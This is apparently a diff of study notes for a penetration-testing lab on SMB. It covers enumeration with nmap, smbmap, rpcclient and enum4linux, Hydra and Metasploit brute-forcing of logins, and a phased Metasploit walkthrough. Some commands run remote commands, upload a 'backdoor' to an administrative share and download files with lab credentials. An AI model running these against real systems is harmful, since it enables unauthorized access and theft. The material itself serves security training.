@@ -1,4 +1,205 @@
-💻 SMB Enumeration and Exploitation WorkflowThis document outlines a workflow for testing and exploiting the Server Message Block (SMB) protocol on a target system, including reconnaissance of version, users, and shares, followed by brute-forcing and manual access.ProtocolServiceAttacker Port (UDP)Target Port (TCP/UDP)SMBServer Message Block137, 138 (NetBIOS)139, 445 (SMB)Target IP192.91.46.3Attacker IP192.91.46.2Phase 1: Environment Setup and Service EnumerationObjective: Set up the Metasploit environment and identify the SMB service version.Setup and InitializationBash# Check local IP and identify target
+📜 SMB Enumeration -> SMB (Server Message Block) is TCP port 445
+
+> nmap -p 445 <target_IP>                             # To identify SMB services using Nmap  
+
+# To check if the target system supports SMB version 1 using Nmap
+> nmap --script smb-vuln-ms17-010 -p 445 <target_IP> 
+> nmap -p 445 --script smb-protocols <target_IP>
+
+> net use * /delete                                   # Remove / Delete SMB Drive from your computer
+
+# Add / Access SMB Drive from your computer
+> net use <your_drive_letter> \\\\<smb_server_ip\\drive$> <password>/user:<username>
+> net use z: \\\\10.17.3.2\\C$ this-is-my-pass/user:admin
+
+SMB: Nmap Enumeration Scripts
+Nmap Scripts to enumerate the running SMB and Samba services.
+
+smb-protocols: Attempts to list the supported protocols and dialects of a SMB server.
+> nmap -p445 --script smb-protocols <target>
+
+smb-security-mode: Returns information about the SMB security level determined by SMB. 
+> nmap --script smb-security-mode.nse -p445 <target>
+
+smb-enum-sessions: Enumerates the users logged into a system either locally or through an SMB share. 
+> nmap -p445 --script smb-enum-sessions.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+> nmap --script smb-enum-sessions.nse -p445 <target>
+
+smb-enum-shares: Attempts to list shares using the srvsvc.NetShareEnumAll MSRPC function and retrieve more information about them using srvsvc.NetShareGetInfo. 
+If access to those functions is denied, a list of common share names are checked.
+> nmap --script smb-enum-shares.nse -p445 <target>
+> nmap -p445 --script smb-enum-shares.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+> nmap -p445 --script smb-enum-shares.nse,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+smb-enum-users: Attempts to enumerate the users on a remote Windows system, with as much information as possible, 
+through two different techniques (both over MSRPC, which uses port 445 or 139; see smb.lua). 
+The goal of this script is to discover all user accounts that exist on a remote system. 
+This can be helpful for administration, by seeing who has an account on a server, or for penetration testing or network footprinting, 
+by determining which accounts exist on a system.
+> nmap --script smb-enum-users.nse -p445 <target> 
+> nmap -p445 --script smb-enum-users.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+smb-server-stats: Attempts to grab the server's statistics over SMB and MSRPC, which uses TCP ports 445 or 139.
+> nmap --script smb-server-stats.nse -p445 <target>
+> nmap -p445 --script smb-server-stats.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+smb-enum-domains: Attempts to enumerate domains on a system, along with their policies.
+> nmap --script smb-enum-domains.nse -p445 <target>
+> nmap -p445 --script smb-enum-domains.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+smb-enum-groups: Obtains a list of groups from the remote Windows system, as well as a list of the group's users.
+> nmap --script smb-enum-users.nse -p445 <target>
+> nmap -p445 --script smb-enum-users.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+smb-enum-services: Retrieves the list of services running on a remote Windows system. 
+Each service attribute contains service name, display name and service status of each service.
+> nmap --script smb-enum-services.nse -p445 <target>
+> nmap -p445 --script smb-enum-services.nse --script-args smbusername=administrator,smbpassword=smbserver_771 <target>
+
+SMB: SMBMap
+Smbmap is a tool designed to enumerate shared resources on a network through the SMB (Server Message Block) protocol. 
+It allows penetration testers to identify accessible shares, enumerate permissions, and read or write files on shared directories, 
+aiding in the discovery of potential security issues in SMB implementations.
+
+This command uses "smbmap" to list accessible shares on the specified target using a null session (guest access) without a password and 
+specifying a comma as a delimiter for domain enumeration.
+> smbmap -u guest -p"" -d, -H <target>
+
+This command uses "smbmap" to enumerate shares on the indicated target, employing the "administrator" username and "smbserver_771" password for authentication, 
+while using a comma as a domain delimiter.
+> smbmap -u administrator -p"smbserver_771" -d, -H <target>
+
+This command employs "smbmap" to execute the 'ipconfig' command on the specified target using the "administrator" username and "smbserver_771" password for 
+authentication, aiming to gather network configuration information.
+> smbmap -H <target> -u administrator -p"smbserver_771" -x 'ipconfig’
+
+This command utilizes "smbmap" to list shares on the provided target, authenticating as "administrator" with the password "smbserver_771" and 
+displaying share information.
+> smbmap -H <target> -u administrator -p"smbserver_771" -L
+
+This command employs "smbmap" to access the 'C$' administrative share on the specified target, using "administrator" as the username and "smbserver_771" 
+as the password for authentication.
+> smbmap -H <target> -u administrator -p"smbserver_771" -r 'C$’
+
+This command uses "smbmap" to upload the 'backdoor' file from '/root' to the 'C$\backdoor' directory on the specified target, authenticating as "administrator" 
+with the password "smbserver_771".
+> smbmap -H <target> -u administrator -p"smbserver_771" --upload '/root/backdoor' 'C$\backdoor’
+
+This command employs "smbmap" to download the 'flag.txt' file from the 'C$' share on the given target, using "administrator" as the username and "smbserver_771" 
+as the password for authentication.
+> smbmap -H <target> -u administrator -p"smbserver_771" --download 'C$\flag.txt’
+
+SMB: Samba
+Samba is an open-source software suite that provides seamless file and print services to SMB/CIFS clients, enabling interoperability between Unix/Linux servers 
+and Windows-based clients. It allows Unix/Linux systems to share files, printers, and other services with Windows systems, facilitating cross-platform network 
+communication and resource sharing. we will explore SMB on Linux systems, also known as Samba (utilizing Port No. 139 & 445). 
+Through the utilization of various tools and scripts, we will conduct Samba discovery and enumeration on Linux systems. 
+The tools and scripts used are outlined below.
+
+RPC-Client tool for Samba Enumeration
+RPC (Remote Procedure Call) is a protocol that lets programs on different computers communicate and request services from each other over a network. 
+It allows remote execution of functions and procedures as if they were local. The most common port for RPC is 135, 
+and additional ports are dynamically allocated for specific services.
+
+Rpcclient: is a command to interact with Windows RPC (Remote Procedure Call) services for various administrative tasks and network information gathering.
+
+This command is used to connect to the specified target's RPC services without providing a username or password, using anonymous authentication.
+> rpcclient -U "" -N <target>
+
+This command is used to retrieve basic information about the remote server's operating system and version using the RPC protocol.
+> rpcclient $> srvinfo
+
+This command is used to list user accounts from the domain using the RPC protocol.
+> rpcclient $> enumdomusers
+
+This command is used to retrieve information about a specific user's SID (Security Identifier) and related attributes using the RPC protocol.
+> rpcclient $> lookupnames <user_name>
+
+This command is used to enumerate domain groups on a remote system using the RPC protocol.
+> rcpcliet $> enumdomgroups
+
+Enum4linux tool for Samba Enumeration
+enum4linux is a Linux tool for gathering information from Windows systems via the SMB protocol. 
+It extracts details such as user accounts, group memberships, shared resources, and more from the target, which aids in network reconnaissance 
+and vulnerability assessment during penetration testing.
+
+This command is used to perform a comprehensive enumeration of information from the specified target's SMB services, revealing details about users, shares, 
+and more.
+> enum4linux -o <target>
+
+This command is used to enumerate user and group information from the specified target in a Windows network using SMB and NetBIOS.
+> enum4linux -U <target>
+
+This command is used to perform a complete enumeration of information from the specified target using the SMB protocol, focusing on gathering user 
+and group information.
+> enum4linux -S <target>
+
+This command is used to enumerate group memberships from the specified target using the SMB protocol.
+> enum4linux -G <target>
+
+This command is used to retrieve information about the specified target's users, shares, and other details using the SMB protocol.
+> enum4linux -i <target>
+
+Smbclient tool for Samba Enumeration
+Smbclient is a command-line tool for accessing and interacting with shared resources on SMB/CIFS servers. 
+It allows users to list, download, upload, and manage files on remote Windows or Samba shares, providing a way to perform basic file operations 
+and explore shared directories over the network.
+
+This command is used to list available shares on the specified target without providing a password, using anonymous authentication.
+> smbclient -L <target> -N
+
+This command is used to access the "Public" share on the specified target without providing a password, using anonymous authentication.
+> smbclient //<target>/Public -N
+
+These commands are used within an interactive SMB session (smbclient) for: displaying help, listing files and directories, changing directories, and retrieving 
+files:
+> smb: \> help
+> smb: \> ls
+> smb: \> cd
+> smb: \> get
+
+
+Msfconsole tool for Samba Enumeration
+Msfconsole is the main command-line interface for the Metasploit Framework, a comprehensive penetration testing tool. 
+It allows users to launch exploits, manage payloads, run auxiliary modules, and conduct various security assessments, offering a powerful environment 
+for discovering and exploiting vulnerabilities in target systems.
+
+> auxiliary/scanner/smb/smb_version: is used to select the SMB version scanner module for identifying SMB protocol versions on a target network.
+
+> auxiliary/scanner/smb/smb2: is used to perform SMB version 2 scanning for vulnerabilities and information gathering.
+
+> auxiliary/scanner/smb/smb_enumshares: it is use to perform SMB share enumeration for network analysis.
+
+Nmblookup tool for Samba Enumeration
+nmblookup is a command-line tool used to perform NetBIOS name lookups over the SMB protocol. 
+It helps identify the IP address associated with a NetBIOS name, which can be useful for network reconnaissance and discovering machines in a 
+local network environment.
+> nmblookup -A <target>
+
+SMB: SMB Dictionary Attack
+SMB Dictionary Attack is a method used to guess credentials for SMB (Server Message Block) services by systematically trying a list of usernames and passwords.
+Attackers use tools to automate the process of attempting different username-password combinations to gain unauthorized access to shared resources or 
+administrative functions on a target system.
+
+In msfconsole, you can use the smb_login auxiliary module to test SMB credentials and attempt to log in to target systems.
+> use auxiliary/scanner/smb/smb_login 
+
+The following command uses Hydra to perform a brute-force attack on the SMB service of the target using the username "admin" and the rockyou.txt wordlist for 
+password guessing.
+> hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> smb
+
+In msfconsole, the pipe_auditor auxiliary module is employed to perform SMB named pipe security assessments on a target network.
+> use auxiliary/scanner/smb/pipe_auditor
+
+💻 SMB Enumeration and Exploitation WorkflowThis document outlines a workflow for testing and exploiting the Server Message Block (SMB) protocol 
+on a target system, including reconnaissance of version, users, and shares, followed by brute-forcing and manual access.
+ProtocolServiceAttacker 
+Port (UDP)Target Port (TCP/UDP)SMBServer Message Block137, 138 (NetBIOS)139, 445 (SMB)
+Target IP192.91.46.3
+Attacker IP192.91.46.2
+Phase 
+1: Environment Setup and Service EnumerationObjective: Set up the Metasploit environment and identify the SMB service version.
+Setup and InitializationBash# Check local IP and identify target
 ifconfig
 # Attacker IP: 192.91.46.2
 # Target IP: 192.91.46.3
@@ -25,7 +226,8 @@ msf5 > show options
 
 # Execute the module
 msf5 > run
-Phase 2: Information Gathering (Users and Shares)Objective: Enumerate valid user accounts and accessible shared folders on the target.User EnumerationBash# Search for SMB modules (if you ran 'back' previously)
+Phase 2: Information Gathering (Users and Shares)Objective: Enumerate valid user accounts and accessible shared folders on the target.
+User EnumerationBash# Search for SMB modules (if you ran 'back' previously)
 # msf5 > search type:auxiliary name:smb
 
 # Select the module to enumerate users (via SID lookups, etc.)
@@ -50,7 +252,9 @@ msf5 > set ShowFiles true
 
 # Execute the module
 msf5 > run
-Phase 3: Authentication Attack (Brute-Forcing)Objective: Attempt to log in using a dictionary attack against the SMB service.SMB Login Brute-ForceBash# Search for SMB modules (if needed)
+Phase 3: Authentication Attack (Brute-Forcing)Objective: Attempt to log in using a dictionary attack against the SMB service.
+SMB Login Brute-ForceBash
+# Search for SMB modules (if needed)
 # msf5 > search type:auxiliary name:smb
 
 # Select the module for dictionary-based SMB login attempts
@@ -71,7 +275,8 @@ msf5 > run
 
 # Exit Metasploit console
 msf5 > exit
-Phase 4: Manual Access and File RetrievalObjective: Use the discovered credentials to manually log in via smbclient and retrieve sensitive data.Listing and Connecting to SharesBash# Use smbclient to list available shares on the target
+Phase 4: Manual Access and File RetrievalObjective: Use the discovered credentials to manually log in via smbclient and retrieve sensitive data.
+Listing and Connecting to SharesBash# Use smbclient to list available shares on the target
 smbclient -L //192.91.46.3 -U admin
 # This requires a password if the user 'admin' requires one.
 
